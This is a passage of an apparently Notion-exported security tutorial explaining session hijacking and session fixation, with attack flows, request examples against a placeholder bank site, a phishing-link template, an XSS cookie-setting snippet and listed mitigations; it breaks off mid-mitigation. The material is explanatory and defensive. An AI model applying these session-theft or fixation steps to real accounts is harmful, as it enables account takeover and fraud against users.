+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80fd-a076-eea6780f5836" class=""><strong>3. Hidden Form Fields:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8096-b191-fb27e3a9d2c8" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;input type=&quot;hidden&quot; name=&quot;sessionid&quot; value=&quot;abc123&quot;&gt;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-8030-89cd-cbff6ef993b2"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-8064-8796-c7e0d5756315" class=""><strong>Session Hijacking</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8078-9bce-e32626e2e733" class=""><strong>Definition</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-805a-82fc-e530e7264cce" class=""><strong>Session hijacking</strong> (also known as session theft or session sidejacking) is the unauthorized takeover of a user&#x27;s active session by an attacker. The attacker steals the session identifier and uses it to impersonate the user.</p></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80f8-95e2-eff8fd45443a" class=""><strong>How Session Hijacking Works</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-804a-912c-d2f3dbf7faf1" class=""><strong>Attack Flow:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80d3-a8d7-ee1a686692ef" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">1. User logs in → Session ID created
+2. User uses application (session active)
+3. Attacker steals session ID (via various methods)
+4. Attacker uses stolen session ID
+5. Server treats attacker as legitimate user
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-802b-a161-cf139a3536d7" class=""><strong>Attack Vectors</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8059-befc-e38b4d661410" class=""><strong>1. Network Sniffing:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8032-8074-dcdf8a6ba5ef" class="bulleted-list"><li style="list-style-type:disc">Intercepting session IDs over unencrypted connections (HTTP)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80c9-a870-cf8faed505b2" class="bulleted-list"><li style="list-style-type:disc">Attacker uses packet sniffer to capture session cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ee-937d-cded5735ee15" class="bulleted-list"><li style="list-style-type:disc"><strong>Mitigation</strong>: Use HTTPS</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80f2-82db-fa6a82b4ba55" class=""><strong>2. Cross-Site Scripting (XSS):</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8016-946a-e2d60ecc552e" class="bulleted-list"><li style="list-style-type:disc">Attacker injects malicious JavaScript</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8052-ab91-cc44a86a7fe3" class="bulleted-list"><li style="list-style-type:disc">Script steals session cookies via <code>document.cookie</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8027-9a17-d78c493d1992" class="bulleted-list"><li style="list-style-type:disc"><strong>Mitigation</strong>: HttpOnly cookies, input validation</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-805d-98f8-ecb86bbb9290" class=""><strong>3. Session Prediction:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80fb-b83d-f87a361edeb7" class="bulleted-list"><li style="list-style-type:disc">Attacker guesses or brute-forces session IDs</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8052-9e16-c414158cebd9" class="bulleted-list"><li style="list-style-type:disc">Weak session ID generation makes this possible</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80a3-8ff6-d7a5bf07bba7" class="bulleted-list"><li style="list-style-type:disc"><strong>Mitigation</strong>: Strong, random session IDs</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-801e-95da-df8c10a51471" class=""><strong>4. Man-in-the-Middle (MitM):</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8064-8dcd-f84118b55b12" class="bulleted-list"><li style="list-style-type:disc">Attacker intercepts communication</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ad-803d-d7f7510f6c52" class="bulleted-list"><li style="list-style-type:disc">Can work even with HTTPS if certificate validation fails</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8034-8595-edbc221ece5d" class="bulleted-list"><li style="list-style-type:disc"><strong>Mitigation</strong>: Proper certificate validation</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80c5-8bd4-f3f187281270" class=""><strong>5. Session Replay:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-801c-8d3b-e8effac26de2" class="bulleted-list"><li style="list-style-type:disc">Attacker captures and reuses session tokens</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8011-8f3d-c06f632dbcbf" class="bulleted-list"><li style="list-style-type:disc">Works if session doesn&#x27;t expire quickly</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-808a-8b1a-eac2dc51c335" class="bulleted-list"><li style="list-style-type:disc"><strong>Mitigation</strong>: Short expiration, nonces</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8042-a65b-e2b9ce09ba25" class=""><strong>Practical Example</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-804b-9aa2-e3cb0fe3b80e" class=""><strong>Scenario: Online Banking</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-804a-b778-f9eec0082b88" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// User logs into banking application
+POST /login
+{
+  username: &quot;user123&quot;,
+  password: &quot;password123&quot;
+}
+
+// Server creates session
+Response:
+Set-Cookie: sessionid=abc123xyz; HttpOnly; Secure
+
+// User accesses account (session active)
+GET /account
+Cookie: sessionid=abc123xyz
+
+// Attacker intercepts session ID (via XSS or network sniffing)
+// Attacker uses stolen session ID
+GET /account
+Cookie: sessionid=abc123xyz  // Stolen session ID
+
+// Server treats attacker as legitimate user
+// Attacker can now:
+// - View account balance
+// - Transfer funds
+// - Access sensitive information
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-8070-8863-febf00392e5d"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-80fb-b6f0-f801a866e7b4" class=""><strong>Session Fixation</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80a5-9235-cab19dba14c9" class=""><strong>Definition</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80f8-82e0-ce3ab58004cd" class=""><strong>Session fixation</strong> is an attack where an attacker sets or fixes a valid session identifier for a targeted user before they authenticate. The attacker tricks the user into using this predetermined session ID, and once the user logs in, the attacker can use the same session ID to access the authenticated session.</p></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80c2-8a7a-d5dba565d081" class=""><strong>How Session Fixation Works</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-808d-adae-f49cbce33255" class=""><strong>Attack Flow:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80cc-9540-f9f3cb72ed1e" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">1. Attacker creates/fixes session ID
+2. Attacker tricks user into using that session ID
+3. User logs in (session becomes authenticated)
+4. Attacker uses the fixed session ID (now authenticated)
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8036-920d-ee37da272dc3" class=""><strong>Attack Methods</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8072-bc87-f11410b76f48" class=""><strong>1. URL-based Session ID:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8031-a335-cfc52dd578f7" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Attacker sends link with session ID in URL
+https://bank.com/login?sessionid=attacker-session-id
+
+// User clicks link
+// User logs in → session becomes authenticated
+// Attacker uses same session ID
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8025-8a19-e3ee2b2fc8fd" class=""><strong>2. Cookie-based Session ID:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8025-a3d8-ee1c154ea599" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Attacker sets cookie via XSS
+document.cookie = &quot;sessionid=attacker-session-id&quot;;
+
+// User logs in → session becomes authenticated
+// Attacker uses same session ID
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-808a-8385-e14a88018149" class=""><strong>3. Social Engineering:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80dc-b5d4-e7ce5c73f18f" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Attacker sends phishing email
+&quot;Click here to login: https://bank.com/login?sessionid=xyz789&quot;
+
+// User clicks, uses attacker&#x27;s session ID
+// User logs in → session becomes authenticated
+// Attacker uses same session ID
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80d5-8c01-dbdd912030cc" class=""><strong>Practical Example</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80c1-9eb9-d0e72a7e9410" class=""><strong>Scenario: Phishing Attack</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-801e-b08a-e1e4f78a0e4c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Step 1: Attacker creates session
+GET /login
+// Server creates session: sessionid=attacker-xyz789
+
+// Step 2: Attacker sends phishing email
+&quot;Click here to access your account:
+https://bank.com/login?sessionid=attacker-xyz789&quot;
+
+// Step 3: User clicks link
+// User&#x27;s browser uses attacker&#x27;s session ID
+GET /login?sessionid=attacker-xyz789
+Cookie: sessionid=attacker-xyz789
+
+// Step 4: User logs in
+POST /login
+{
+  username: &quot;user123&quot;,
+  password: &quot;password123&quot;
+}
+Cookie: sessionid=attacker-xyz789
+
+// Server authenticates user
+// Session becomes authenticated
+// But still uses attacker&#x27;s session ID!
+
+// Step 5: Attacker uses same session ID
+GET /account
+Cookie: sessionid=attacker-xyz789
+
+// Server treats attacker as authenticated user
+// Attack succeeds!
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-809c-b117-efc9ca389c99"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-8096-945d-d4dff9ebc7e5" class=""><strong>Attack Vectors</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80b6-99e9-c879a8984464" class=""><strong>Session Hijacking Attack Vectors</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8076-a76d-f2109de8d3c8" class=""><strong>1. Network Sniffing:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80a8-8de2-d36e898a8554" class="bulleted-list"><li style="list-style-type:disc">Intercepting unencrypted HTTP traffic</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8052-b183-ced05d780862" class="bulleted-list"><li style="list-style-type:disc">Capturing session cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80e8-93c6-f8a3ec350f31" class="bulleted-list"><li style="list-style-type:disc"><strong>Risk</strong>: High on unencrypted networks</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ba-8cf3-d38b78e14721" class="bulleted-list"><li style="list-style-type:disc"><strong>Mitigation</strong>: HTTPS</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8091-858a-df5f161da4b2" class=""><strong>2. XSS (Cross-Site Scripting):</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8054-8d2a-c1edcff310dd" class="bulleted-list"><li style="list-style-type:disc">Injecting malicious JavaScript</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8036-af79-f7659df32409" class="bulleted-list"><li style="list-style-type:disc">Stealing cookies via <code>document.cookie</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-801a-9ecf-fc332877bb50" class="bulleted-list"><li style="list-style-type:disc"><strong>Risk</strong>: High if XSS vulnerability exists</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80de-be31-e36e8a9c471f" class="bulleted-list"><li style="list-style-type:disc"><strong>Mitigation</strong>: HttpOnly cookies, input validation</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8045-a0ea-cdd402e680b4" class=""><strong>3. Session Prediction:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80a9-885f-eac7436a75f4" class="bulleted-list"><li style="list-style-type:disc">Guessing session IDs</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8019-8a43-f4102cb7fd54" class="bulleted-list"><li style="list-style-type:disc">Brute-forcing weak session IDs</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-801f-b7dd-fd0f2dd74787" class="bulleted-list"><li style="list-style-type:disc"><strong>Risk</strong>: Medium if session IDs are weak</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-807f-87c6-e83dcab5f71f" class="bulleted-list"><li style="list-style-type:disc"><strong>Mitigation</strong>: Strong, random session IDs</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8027-8596-c9cf1d34ac80" class=""><strong>4. Man-in-the-Middle:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8088-858e-fab39beca172" class="bulleted-list"><li style="list-style-type:disc">Intercepting HTTPS traffic</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80d6-89e0-f83ca9299d81" class="bulleted-list"><li style="list-style-type:disc">Works if certificate validation fails</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8086-8d8c-ee8c32416197" class="bulleted-list"><li style="list-style-type:disc"><strong>Risk</strong>: Medium if certificate validation is weak</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80a5-9433-fd83184407a9" class="bulleted-list"><li style="list-style-type:disc"><strong>Mitigation</strong>: Proper certificate validation</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-804f-8bc3-f6d2f73bce22" class=""><strong>Session Fixation Attack Vectors</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80a3-a6ba-fbaf1b6d58da" class=""><strong>1. URL Manipulation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80aa-81a5-c2799d7459df" class="bulleted-list"><li style="list-style-type:disc">Session ID in URL parameter</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-800a-928a-e648a85029c9" class="bulleted-list"><li style="list-style-type:disc">Attacker sends link with predetermined ID</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80cf-b670-e85aaf6eab6f" class="bulleted-list"><li style="list-style-type:disc"><strong>Risk</strong>: High if session ID in URL</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8034-b560-dd35adaf736b" class="bulleted-list"><li style="list-style-type:disc"><strong>Mitigation</strong>: Don&#x27;t use URL-based session IDs</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-801a-ac62-f924a3b155c3" class=""><strong>2. Cookie Manipulation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80a1-b853-f38c0471b284" class="bulleted-list"><li style="list-style-type:disc">Setting cookie via XSS</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80c4-8863-e3e5b7da9fb5" class="bulleted-list"><li style="list-style-type:disc">Forcing user to use attacker&#x27;s session ID</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-806a-b396-dde1809b1c8d" class="bulleted-list"><li style="list-style-type:disc"><strong>Risk</strong>: High if XSS vulnerability exists</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-802e-90fa-c7ed6853cd97" class="bulleted-list"><li style="list-style-type:disc"><strong>Mitigation</strong>: HttpOnly cookies, session ID regeneration</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-803e-94d2-c68a8b33bd46" class=""><strong>3. Social Engineering:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-806c-9ea5-de5aa5792156" class="bulleted-list"><li style="list-style-type:disc">Phishing emails with session ID</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-807c-a6c6-cfa39bb72415" class="bulleted-list"><li style="list-style-type:disc">Tricking user into using attacker&#x27;s session</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8067-835b-db2c5a3b87a2" class="bulleted-list"><li style="list-style-type:disc"><strong>Risk</strong>: Medium (depends on user awareness)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-809b-81cd-c2bd880293f7" class="bulleted-list"><li style="list-style-type:disc"><strong>Mitigation</strong>: Session ID regeneration after login</li></ul></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-807b-afd6-d252a4aad8e5"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-80a8-b43b-e0515bb2427b" class=""><strong>Differences Between Attacks</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80c2-8e74-c41bfd57532b" class=""><strong>Comparison Table</strong></h3></div><div style="display:contents" dir="ltr"><table id="2cf562ad-76f0-803b-9ecc-cb7897b6a596" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-80a2-8c4b-d88ac2c570bf"><th id="mixN" class="simple-table-header-color simple-table-header">Aspect</th><th id="UAgv" class="simple-table-header-color simple-table-header">Session Hijacking</th><th id="OJkd" class="simple-table-header-color simple-table-header">Session Fixation</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-80fc-b195-e971987fe0c2"><td id="mixN" class=""><strong>Timing</strong></td><td id="UAgv" class="">After user logs in</td><td id="OJkd" class="">Before/during login</td></tr></div><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-80ea-9f13-f4d3f51eebb0"><td id="mixN" class=""><strong>Method</strong></td><td id="UAgv" class="">Steal existing session ID</td><td id="OJkd" class="">Force user to use predetermined ID</td></tr></div><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-804d-ba8b-ef6fcf9cba81"><td id="mixN" class=""><strong>Attack Vector</strong></td><td id="UAgv" class="">XSS, sniffing, prediction</td><td id="OJkd" class="">Social engineering, URL manipulation</td></tr></div><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-80d0-b44f-ef6a1ec8dae6"><td id="mixN" class=""><strong>Session State</strong></td><td id="UAgv" class="">Session already authenticated</td><td id="OJkd" class="">Session becomes authenticated</td></tr></div><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-8048-8586-c0e68c4f8359"><td id="mixN" class=""><strong>Mitigation</strong></td><td id="UAgv" class="">HttpOnly, HTTPS, strong IDs</td><td id="OJkd" class="">Session ID regeneration</td></tr></div><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-8075-b523-d1cf7a4f45a2"><td id="mixN" class=""><strong>Complexity</strong></td><td id="UAgv" class="">Medium</td><td id="OJkd" class="">Low (easier to execute)</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8044-b3af-dd69bbc235e7" class=""><strong>Key Differences</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8052-9547-d5e9aa822ae5" class=""><strong>1. Timing:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-804f-a6c9-e74984bb93cf" class="bulleted-list"><li style="list-style-type:disc"><strong>Session Hijacking</strong>: After authentication (session active)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-807a-b1f3-cad7b7f6939a" class="bulleted-list"><li style="list-style-type:disc"><strong>Session Fixation</strong>: Before/during authentication</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8009-8aa6-c8eb641c9cfd" class=""><strong>2. Attack Method:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8052-ac70-eba381de1244" class="bulleted-list"><li style="list-style-type:disc"><strong>Session Hijacking</strong>: Stealing existing session ID</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80cb-aaec-ed30dc5ee812" class="bulleted-list"><li style="list-style-type:disc"><strong>Session Fixation</strong>: Forcing user to use attacker&#x27;s session ID</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8038-99bf-fa5c991862ac" class=""><strong>3. Attack Vector:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8068-94a5-e5828e59213d" class="bulleted-list"><li style="list-style-type:disc"><strong>Session Hijacking</strong>: XSS, network sniffing, prediction</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8001-9c2d-dcb671fbc2a0" class="bulleted-list"><li style="list-style-type:disc"><strong>Session Fixation</strong>: Social engineering, URL manipulation</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80e4-8f72-f145e68b2325" class=""><strong>4. Mitigation Focus:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-804a-9375-f249e9a98b8d" class="bulleted-list"><li style="list-style-type:disc"><strong>Session Hijacking</strong>: Protect session ID (HttpOnly, HTTPS)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ae-a93a-d3fb5b2ff093" class="bulleted-list"><li style="list-style-type:disc"><strong>Session Fixation</strong>: Regenerate session ID after login</li></ul></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-8055-9582-c4b9edeb0cda"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-8026-9825-c62a480d66a3" class=""><strong>Mitigations</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8068-a458-cd7042fd6c4e" class=""><strong>Mitigations for Session Hijacking</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80db-8ae8-ee4151371c63" class=""><strong>1. Use Secure Connections (HTTPS):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80c5-acca-c0520b3b1334" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Always use HTTPS
+// Prevents network sniffing
+Set-Cookie: sessionid=abc123; Secure; HttpOnly
